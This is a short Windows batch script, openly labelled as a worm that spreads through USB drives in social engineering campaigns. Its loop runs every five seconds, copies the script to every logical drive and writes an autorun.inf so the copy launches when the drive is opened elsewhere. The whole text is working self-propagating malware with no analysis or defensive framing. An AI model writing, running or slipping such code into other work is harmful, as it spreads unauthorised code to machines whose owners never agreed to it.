#Windows batch script that copies itself to any USB drive inserted.
#Emulates a simple worm that auto-propagates via USB drives — popular in social engineering campaigns.
@echo off
:x
for /f "tokens=1" %%a in ('wmic logicaldisk get name ^| find ":"') do (
    copy worm.bat %%a\worm.bat
    echo [autorun] > %%a\autorun.inf
    echo open=worm.bat >> %%a\autorun.inf
)
timeout /t 5
goto x
